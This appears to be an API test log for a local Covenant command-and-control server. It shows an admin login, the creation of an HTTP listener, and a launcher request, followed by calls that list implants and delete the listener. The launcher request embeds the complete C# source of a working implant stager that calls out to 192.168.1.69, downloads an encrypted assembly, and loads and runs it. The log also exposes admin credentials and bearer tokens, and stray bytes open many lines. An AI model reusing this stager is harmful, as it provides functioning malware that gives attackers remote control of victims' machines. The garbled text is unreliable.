Request method:	POST
5Request URI:	https://127.0.0.1:7443/api/users/login
Proxy:			<none>
Request params:	<none>
Query params:	<none>
Form params:	<none>
Path params:	<none>
Headers:		Accept=*/*
2				Content-Type=application/json; charset=UTF-8
Cookies:		<none>
Multiparts:		<none>
Body:
{
    "password": "123",
    "userName": "admin"
}
HTTP/1.1 200 OK
%Date: Thu, 28 Apr 2022 09:45:59 GMT
/Content-Type: application/json; charset=utf-8
Server: Kestrel
Content-Length: 528
Cache-Control: no-cache
Pragma: no-cache
(Expires: Thu, 01 Jan 1970 00:00:00 GMT
ùSet-Cookie: .AspNetCore.Identity.Application=CfDJ8LwZRVheJvhClq4PUp6UKgaJssvVNULg0itjMT6C7AiUrKFgx1Wmj1hHG-A-vj5sCQ8SGfUk9k998fJp6IyPBd37s73DW2bQTRgiRx4_oUjYPTz464uWbemt2f-nAvykVVfh-YPLndbAWQtu6YPr4_zSgsgamAXYEsjyDIXwLVecazVluYVCqi61X4U0X7dtdQ_bWEA03kvuDRdzEa4_tv8o7fdhC79Sk1iCkupUcvfyuhH7eRwPQ8FnxfCHVaHr0LZM_sbrILM8INWjT08tdCffmZDPeljU-PPN2-HjeR5pXK1Koq3KsQm05qTtSQi482VhnRplesYGcXyTx8m82JkIWgxic9E9TgI640InJNIj6MDW_lWr4wz3BLjJ_ltUHoWJDttSsV0mfZHPApx4hU9jpZVAedy4fMpRAPGmwY9f0HKdBkHKEwVbiwz9pRNDF0zjA1ciyYBB4vlxj_g9LyNARWvuTboAkTisXpaPsRhRhy9I7ZfaHyuJlvM-mmlMdAg9FHQ1uMzNig3lRetl65pIzBjAbXBjj9wxJmYybQ3zvxydOtrw3XBUB3zNjgdKop1l1-iG1lSCXqNzpX9iNQ8fRhu_hX5U-mzrW00tKRBc-Wi4F4EWl_g_6tdmu3Ctf9Yzp1tXnTve9xdh-7EBQpeEXIEaGZNANf_2sEZAGehpripB0HNKb7bT-qZsmaYjYztln3Qa6D9PrMASb5wGZpfdFwAL_H5fdbkggYYee0OEGAamQE4AIUgUmvZFUjcGAH89zBToqEL3MgzO-4Xe4Sz2bY31HNc_muPN5r9S00DXzD5iNB3QqzLuTWTKJEHlrg; path=/; secure; samesite=lax; httponly

{
    "success": true,
Ö    "covenantToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImp0aSI6IjgyOGRiOWIyLTlmMTQtYzFkYS0yYzAzLWZmNjdkN2IyMDIxNSIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL25hbWVpZGVudGlmaWVyIjoiZDZjMzRmNWMtZTNiYi00OTJhLWFjMmItYjczZjFiNTllYmUxIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlVzZXIiLCJBZG1pbmlzdHJhdG9yIl0sImV4cCI6MTY1OTc3OTE2MCwiaXNzIjoiQ292ZW5hbnQiLCJhdWQiOiJDb3ZlbmFudCJ9.m07h-OSjxLIgpJzaBWzYa8ugowxKzi5KIRtUIpaYFtg"
}
Request method:	POST
8Request URI:	https://127.0.0.1:7443/api/listeners/http
Proxy:			<none>
Request params:	<none>
Query params:	<none>
Form params:	<none>
Path params:	<none>
éHeaders:		Authorization=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImp0aSI6IjgyOGRiOWIyLTlmMTQtYzFkYS0yYzAzLWZmNjdkN2IyMDIxNSIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL25hbWVpZGVudGlmaWVyIjoiZDZjMzRmNWMtZTNiYi00OTJhLWFjMmItYjczZjFiNTllYmUxIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlVzZXIiLCJBZG1pbmlzdHJhdG9yIl0sImV4cCI6MTY1OTc3OTE2MCwiaXNzIjoiQ292ZW5hbnQiLCJhdWQiOiJDb3ZlbmFudCJ9.m07h-OSjxLIgpJzaBWzYa8ugowxKzi5KIRtUIpaYFtg
				Accept=*/*
2				Content-Type=application/json; charset=UTF-8
Cookies:		<none>
Multiparts:		<none>
Body:
{
    "bindPort": 81,
    "listenerType": {
        "name": "HTTP",
)        "description": "cxfgxdfbFDJYGK",
        "id": 1
    },
Ü    "covenantToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImp0aSI6IjgyOGRiOWIyLTlmMTQtYzFkYS0yYzAzLWZmNjdkN2IyMDIxNSIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL25hbWVpZGVudGlmaWVyIjoiZDZjMzRmNWMtZTNiYi00OTJhLWFjMmItYjczZjFiNTllYmUxIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlVzZXIiLCJBZG1pbmlzdHJhdG9yIl0sImV4cCI6MTY1OTc3OTE2MCwiaXNzIjoiQ292ZW5hbnQiLCJhdWQiOiJDb3ZlbmFudCJ9.m07h-OSjxLIgpJzaBWzYa8ugowxKzi5KIRtUIpaYFtg",
    "profile": {
∏        "messageTransform": "public static class MessageTransform\\n{\\n    public static string Transform(byte[] bytes)\\n    {\\n        return System.Convert.ToBase64String(bytes);\\n    }\\n    public static byte[] Invert(string str) {\\n        return System.Convert.FromBase64String(str);\\n    }\\n}\\n",
&        "name": "DefaultHttpProfile",
-        "description": "DefaultHttpProfile",
        "id": 1,
        "type": "HTTP"
    },
&    "description": "testDescription",
    "connectPort": 80,
    "bindAddress": "0.0.0.0",
    "useSSL": false,
    "urls": [
!        "http://192.168.1.69:80"
    ],
    "profileId": 1,
    "name": "testName",
    "guid": "fdvzdvsdv",
    "listenerTypeId": 1,
-    "covenantUrl": "https://localhost:7443",
-    "startTime": "2022-04-24T14:33:08.216Z",
    "connectAddresses": [
        "192.168.1.69"
    ],
    "status": "active"
}
Request method:	PUT
:Request URI:	https://127.0.0.1:7443/api/launchers/binary
Proxy:			<none>
Request params:	<none>
Query params:	<none>
Form params:	<none>
Path params:	<none>
éHeaders:		Authorization=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImp0aSI6IjgyOGRiOWIyLTlmMTQtYzFkYS0yYzAzLWZmNjdkN2IyMDIxNSIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL25hbWVpZGVudGlmaWVyIjoiZDZjMzRmNWMtZTNiYi00OTJhLWFjMmItYjczZjFiNTllYmUxIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlVzZXIiLCJBZG1pbmlzdHJhdG9yIl0sImV4cCI6MTY1OTc3OTE2MCwiaXNzIjoiQ292ZW5hbnQiLCJhdWQiOiJDb3ZlbmFudCJ9.m07h-OSjxLIgpJzaBWzYa8ugowxKzi5KIRtUIpaYFtg
				Accept=*/*
2				Content-Type=application/json; charset=UTF-8
Cookies:		<none>
Multiparts:		<none>
Body:
{
    "implantTemplateId": 1,
/    "killDate": "2022-05-24T17:06:31.9076718",
    "launcherString": "file",
    "dotNetVersion": "net40",
P    "description": "Uses a generated .NET Framework binary to launch a Grunt.",
    "type": "binary",
$    "runtimeIdentifier": "win_x64",
    "connectAttempts": 5000,
    "validateCert": false,
    "listenerId": 50,
    "smbPipeName": "gruntsvc",
    "delay": 5,
    "jitterPercent": 10,
±}    "stagerCode": "using System;\r\nusing System.Net;\r\nusing System.Linq;\r\nusing System.Text;\r\nusing System.Text.RegularExpressions;\r\nusing System.IO.Pipes;\r\nusing System.Reflection;\r\nusing System.Collections.Generic;\r\nusing System.Security.Cryptography;\r\n\r\nnamespace GruntStager\r\n{\r\n    public class GruntStager\r\n    {\r\n        public GruntStager()\r\n        {\r\n            ExecuteStager();\r\n        }\r\n        [STAThread]\r\n        public static void Main(string[] args)\r\n        {\r\n            new GruntStager();\r\n        }\r\n        public static void Execute()\r\n        {\r\n            new GruntStager();\r\n        }\r\n        public void ExecuteStager()\r\n        {\r\n            try\r\n            {\r\n                List<string> CovenantURIs = @\"http://192.168.1.69:80\".Split(',').ToList();\r\n                string CovenantCertHash = @\"\";\r\n\t\t\t\tList<string> ProfileHttpHeaderNames = @\"VXNlci1BZ2VudA==,Q29va2ll\".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();\r\n\t\t\t\tList<string> ProfileHttpHeaderValues = @\"TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==,QVNQU0VTU0lPTklEPXtHVUlEfTsgU0VTU0lPTklEPTE1NTIzMzI5NzE3NTA=\".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();\r\n\t\t\t\tList<string> ProfileHttpUrls = @\"L2VuLXVzL2luZGV4Lmh0bWw=,L2VuLXVzL2RvY3MuaHRtbA==,L2VuLXVzL3Rlc3QuaHRtbA==\".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();\r\n\t\t\t\tstring ProfileHttpPostRequest = @\"i=a19ea23062db990386a3a478cb89d52e&data={0}&session=75db-99b1-25fe4e9afbe58696-320bea73\".Replace(Environment.NewLine, \"\\n\");\r\n                string ProfileHttpPostResponse = @\"<html>\n    <head>\n        <title>Hello World!</title>\n    </head>\n    <body>\n        <p>Hello World!</p>\n        // Hello World! {0}\n    </body>\n</html>\".Replace(Environment.NewLine, \"\\n\");\r\n                bool ValidateCert = bool.Parse(@\"false\");\r\n                bool UseCertPinning = bool.Parse(@\"false\");\r\n\r\n                Random random = new Random();\r\n                string aGUID = @\"2649a65d94\";\r\n                string GUID = Guid.NewGuid().ToString().Replace(\"-\", \"\").Substring(0, 10);\r\n                byte[] SetupKeyBytes = Convert.FromBase64String(@\"MnrqGxqwlWpbY9NPgf79fVq43PIIJyiVY0tDoJ5JgFo=\");\r\n                string MessageFormat = @\"{{\"\"GUID\"\":\"\"{0}\"\",\"\"Type\"\":{1},\"\"Meta\"\":\"\"{2}\"\",\"\"IV\"\":\"\"{3}\"\",\"\"EncryptedMessage\"\":\"\"{4}\"\",\"\"HMAC\"\":\"\"{5}\"\"}}\";\r\n\r\n                Aes SetupAESKey = Aes.Create();\r\n                SetupAESKey.Mode = CipherMode.CBC;\r\n                SetupAESKey.Padding = PaddingMode.PKCS7;\r\n                SetupAESKey.Key = SetupKeyBytes;\r\n                SetupAESKey.GenerateIV();\r\n                HMACSHA256 hmac = new HMACSHA256(SetupKeyBytes);\r\n                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());\r\n\r\n                byte[] RSAPublicKeyBytes = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));\r\n                byte[] EncryptedRSAPublicKey = SetupAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);\r\n                byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);\r\n                string Stage0Body = String.Format(MessageFormat, aGUID + GUID, \"0\", \"\", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));\r\n\r\n                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;\r\n                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>\r\n                {\r\n                    bool valid = true;\r\n                    if (UseCertPinning && CovenantCertHash != \"\")\r\n                    {\r\n                        valid = cert.GetCertHashString() == CovenantCertHash;\r\n                    }\r\n                    if (valid && ValidateCert)\r\n                    {\r\n                        valid = errors == System.Net.Security.SslPolicyErrors.None;\r\n                    }\r\n                    return valid;\r\n                };\r\n                string transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage0Body));\r\n                CookieWebClient wc = null;\r\n                string Stage0Response = \"\";\r\n                wc = new CookieWebClient();\r\n                wc.UseDefaultCredentials = true;\r\n                wc.Proxy = WebRequest.DefaultWebProxy;\r\n                wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;\r\n                string CovenantURI = \"\";\r\n                foreach (string uri in CovenantURIs)\r\n                {\r\n                    try\r\n                    {\r\n                        for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)\r\n                        {\r\n                            if (ProfileHttpHeaderNames[i] == \"Cookie\")\r\n                            {\r\n                                wc.SetCookies(new Uri(uri), ProfileHttpHeaderValues[i].Replace(\";\", \",\").Replace(\"{GUID}\", \"\"));\r\n                            }\r\n                            else\r\n                            {\r\n                                wc.Headers.Set(ProfileHttpHeaderNames[i].Replace(\"{GUID}\", \"\"), ProfileHttpHeaderValues[i].Replace(\"{GUID}\", \"\"));\r\n                            }\r\n                        }\r\n                        wc.DownloadString(uri + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace(\"{GUID}\", \"\"));\r\n                        CovenantURI = uri;\r\n                    }\r\n                    catch\r\n                    {\r\n                        continue;\r\n                    }\r\n                }\r\n                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)\r\n                {\r\n                    if (ProfileHttpHeaderNames[i] == \"Cookie\")\r\n                    {\r\n                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(\";\", \",\").Replace(\"{GUID}\", GUID));\r\n                    }\r\n                    else\r\n                    {\r\n                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace(\"{GUID}\", GUID), ProfileHttpHeaderValues[i].Replace(\"{GUID}\", GUID));\r\n                    }\r\n                }\r\n                Stage0Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace(\"{GUID}\", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));\r\n                string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];\r\n                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));\r\n                List<string> parsed = Parse(extracted, MessageFormat);\r\n                string iv64str = parsed[3];\r\n                string message64str = parsed[4];\r\n                string hash64str = parsed[5];\r\n                byte[] messageBytes = Convert.FromBase64String(message64str);\r\n                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }\r\n                SetupAESKey.IV = Convert.FromBase64String(iv64str);\r\n                byte[] PartiallyDecrypted = SetupAESKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);\r\n                byte[] FullyDecrypted = rsa.Decrypt(PartiallyDecrypted, true);\r\n\r\n                Aes SessionKey = Aes.Create();\r\n                SessionKey.Mode = CipherMode.CBC;\r\n                SessionKey.Padding = PaddingMode.PKCS7;\r\n                SessionKey.Key = FullyDecrypted;\r\n                SessionKey.GenerateIV();\r\n                hmac = new HMACSHA256(SessionKey.Key);\r\n                byte[] challenge1 = new byte[4];\r\n                RandomNumberGenerator rng = RandomNumberGenerator.Create();\r\n                rng.GetBytes(challenge1);\r\n                byte[] EncryptedChallenge1 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);\r\n                hash = hmac.ComputeHash(EncryptedChallenge1);\r\n\r\n                string Stage1Body = String.Format(MessageFormat, GUID, \"1\", \"\", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge1), Convert.ToBase64String(hash));\r\n                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));\r\n\r\n                string Stage1Response = \"\";\r\n                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)\r\n                {\r\n                    if (ProfileHttpHeaderNames[i] == \"Cookie\")\r\n                    {\r\n                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(\";\", \",\").Replace(\"{GUID}\", GUID));\r\n                    }\r\n                    else\r\n                    {\r\n                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace(\"{GUID}\", GUID), ProfileHttpHeaderValues[i].Replace(\"{GUID}\", GUID));\r\n                    }\r\n                }\r\n                Stage1Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace(\"{GUID}\", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));\r\n                extracted = Parse(Stage1Response, ProfileHttpPostResponse)[0];\r\n                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));\r\n                parsed = Parse(extracted, MessageFormat);\r\n                iv64str = parsed[3];\r\n                message64str = parsed[4];\r\n                hash64str = parsed[5];\r\n                messageBytes = Convert.FromBase64String(message64str);\r\n                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }\r\n                SessionKey.IV = Convert.FromBase64String(iv64str);\r\n\r\n                byte[] DecryptedChallenges = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);\r\n                byte[] challenge1Test = new byte[4];\r\n                byte[] challenge2 = new byte[4];\r\n                Buffer.BlockCopy(DecryptedChallenges, 0, challenge1Test, 0, 4);\r\n                Buffer.BlockCopy(DecryptedChallenges, 4, challenge2, 0, 4);\r\n                if (Convert.ToBase64String(challenge1) != Convert.ToBase64String(challenge1Test)) { return; }\r\n\r\n                SessionKey.GenerateIV();\r\n                byte[] EncryptedChallenge2 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge2, 0, challenge2.Length);\r\n                hash = hmac.ComputeHash(EncryptedChallenge2);\r\n\r\n                string Stage2Body = String.Format(MessageFormat, GUID, \"2\", \"\", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge2), Convert.ToBase64String(hash));\r\n                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));\r\n\r\n                string Stage2Response = \"\";\r\n                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)\r\n                {\r\n                    if (ProfileHttpHeaderNames[i] == \"Cookie\")\r\n                    {\r\n                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(\";\", \",\").Replace(\"{GUID}\", GUID));\r\n                    }\r\n                    else\r\n                    {\r\n                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace(\"{GUID}\", GUID), ProfileHttpHeaderValues[i].Replace(\"{GUID}\", GUID));\r\n                    }\r\n                }\r\n                Stage2Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace(\"{GUID}\", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));\r\n                extracted = Parse(Stage2Response, ProfileHttpPostResponse)[0];\r\n                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));\r\n                parsed = Parse(extracted, MessageFormat);\r\n                iv64str = parsed[3];\r\n                message64str = parsed[4];\r\n                hash64str = parsed[5];\r\n                messageBytes = Convert.FromBase64String(message64str);\r\n                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }\r\n                SessionKey.IV = Convert.FromBase64String(iv64str);\r\n                byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);\r\n                Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);\r\n                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });\r\n            }\r\n            catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }\r\n        }\r\n\r\n        public class CookieWebClient : WebClient\r\n        {\r\n            public CookieContainer CookieContainer { get; private set; }\r\n            public CookieWebClient()\r\n            {\r\n                this.CookieContainer = new CookieContainer();\r\n            }\r\n            public void SetCookies(Uri uri, string cookies)\r\n            {\r\n                this.CookieContainer.SetCookies(uri, cookies);\r\n            }\r\n            protected override WebRequest GetWebRequest(Uri address)\r\n            {\r\n                var request = base.GetWebRequest(address) as HttpWebRequest;\r\n                if (request == null) return base.GetWebRequest(address);\r\n                request.CookieContainer = CookieContainer;\r\n                return request;\r\n            }\r\n        }\r\n\r\n        public static List<string> Parse(string data, string format)\r\n        {\r\n            format = Regex.Escape(format).Replace(\"\\\\{\", \"{\").Replace(\"{{\", \"{\").Replace(\"}}\", \"}\");\r\n            if (format.Contains(\"{0}\")) { format = format.Replace(\"{0}\", \"(?'group0'.*)\"); }\r\n            if (format.Contains(\"{1}\")) { format = format.Replace(\"{1}\", \"(?'group1'.*)\"); }\r\n            if (format.Contains(\"{2}\")) { format = format.Replace(\"{2}\", \"(?'group2'.*)\"); }\r\n            if (format.Contains(\"{3}\")) { format = format.Replace(\"{3}\", \"(?'group3'.*)\"); }\r\n            if (format.Contains(\"{4}\")) { format = format.Replace(\"{4}\", \"(?'group4'.*)\"); }\r\n            if (format.Contains(\"{5}\")) { format = format.Replace(\"{5}\", \"(?'group5'.*)\"); }\r\n            Match match = new Regex(format).Match(data);\r\n            List<string> matches = new List<string>();\r\n            if (match.Groups[\"group0\"] != null) { matches.Add(match.Groups[\"group0\"].Value); }\r\n            if (match.Groups[\"group1\"] != null) { matches.Add(match.Groups[\"group1\"].Value); }\r\n            if (match.Groups[\"group2\"] != null) { matches.Add(match.Groups[\"group2\"].Value); }\r\n            if (match.Groups[\"group3\"] != null) { matches.Add(match.Groups[\"group3\"].Value); }\r\n            if (match.Groups[\"group4\"] != null) { matches.Add(match.Groups[\"group4\"].Value); }\r\n            if (match.Groups[\"group5\"] != null) { matches.Add(match.Groups[\"group5\"].Value); }\r\n            return matches;\r\n        }\r\n\r\n        public static class MessageTransform\n{\n    public static string Transform(byte[] bytes)\n    {\n        return System.Convert.ToBase64String(bytes);\n    }\n    public static byte[] Invert(string str) {\n        return System.Convert.FromBase64String(str);\n    }\n}\n\r\n    }\r\n}",
    "compressStager": false,
    "name": "Binary",
    "useCertPinning": false,
'    "outputKind": "consoleApplication"
}
Request method:	POST
:Request URI:	https://127.0.0.1:7443/api/launchers/binary
Proxy:			<none>
Request params:	<none>
Query params:	<none>
Form params:	<none>
Path params:	<none>
éHeaders:		Authorization=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImp0aSI6IjgyOGRiOWIyLTlmMTQtYzFkYS0yYzAzLWZmNjdkN2IyMDIxNSIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL25hbWVpZGVudGlmaWVyIjoiZDZjMzRmNWMtZTNiYi00OTJhLWFjMmItYjczZjFiNTllYmUxIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlVzZXIiLCJBZG1pbmlzdHJhdG9yIl0sImV4cCI6MTY1OTc3OTE2MCwiaXNzIjoiQ292ZW5hbnQiLCJhdWQiOiJDb3ZlbmFudCJ9.m07h-OSjxLIgpJzaBWzYa8ugowxKzi5KIRtUIpaYFtg
				Accept=*/*
2				Content-Type=application/json; charset=UTF-8
Cookies:		<none>
Multiparts:		<none>
Body:			<none>
Request method:	GET
BRequest URI:	https://127.0.0.1:7443/api/listeners/24/hostedfiles
Proxy:			<none>
Request params:	<none>
Query params:	<none>
Form params:	<none>
Path params:	<none>
éHeaders:		Authorization=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImp0aSI6ImFkYWM5ZjAwLThmNzAtYTFkYS03ZTYzLWUyNWVmNThjOGMzNSIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL25hbWVpZGVudGlmaWVyIjoiZDZjMzRmNWMtZTNiYi00OTJhLWFjMmItYjczZjFiNTllYmUxIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlVzZXIiLCJBZG1pbmlzdHJhdG9yIl0sImV4cCI6MTY1OTc3Mzk0OCwiaXNzIjoiQ292ZW5hbnQiLCJhdWQiOiJDb3ZlbmFudCJ9.6ntjIYrco5uLTQP2zI5tBFSDK4xNgHleaAgyv1wfIcc
				Accept=*/*
2				Content-Type=application/json; charset=UTF-8
Cookies:		<none>
Multiparts:		<none>
Body:			<none>
'Successfully connected to the server!
!Successfully uploaded the file!
Request method:	GET
0Request URI:	https://127.0.0.1:7443/api/grunts
Proxy:			<none>
Request params:	<none>
Query params:	<none>
Form params:	<none>
Path params:	<none>
éHeaders:		Authorization=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImp0aSI6IjgyOGRiOWIyLTlmMTQtYzFkYS0yYzAzLWZmNjdkN2IyMDIxNSIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL25hbWVpZGVudGlmaWVyIjoiZDZjMzRmNWMtZTNiYi00OTJhLWFjMmItYjczZjFiNTllYmUxIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlVzZXIiLCJBZG1pbmlzdHJhdG9yIl0sImV4cCI6MTY1OTc3OTE2MCwiaXNzIjoiQ292ZW5hbnQiLCJhdWQiOiJDb3ZlbmFudCJ9.m07h-OSjxLIgpJzaBWzYa8ugowxKzi5KIRtUIpaYFtg
				Accept=*/*
2				Content-Type=application/json; charset=UTF-8
Cookies:		<none>
Multiparts:		<none>
Body:			<none>

Request method:	DELETE

6Request URI:	https://127.0.0.1:7443/api/listeners/50

Proxy:			<none>

Request params:	<none>

Query params:	<none>

Form params:	<none>

Path params:	<none>

éHeaders:		Authorization=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImp0aSI6IjgyOGRiOWIyLTlmMTQtYzFkYS0yYzAzLWZmNjdkN2IyMDIxNSIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL25hbWVpZGVudGlmaWVyIjoiZDZjMzRmNWMtZTNiYi00OTJhLWFjMmItYjczZjFiNTllYmUxIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlVzZXIiLCJBZG1pbmlzdHJhdG9yIl0sImV4cCI6MTY1OTc3OTE2MCwiaXNzIjoiQ292ZW5hbnQiLCJhdWQiOiJDb3ZlbmFudCJ9.m07h-OSjxLIgpJzaBWzYa8ugowxKzi5KIRtUIpaYFtg

				Accept=*/*

2				Content-Type=application/json; charset=UTF-8

Cookies:		<none>

Multiparts:		<none>

Body:			<none>
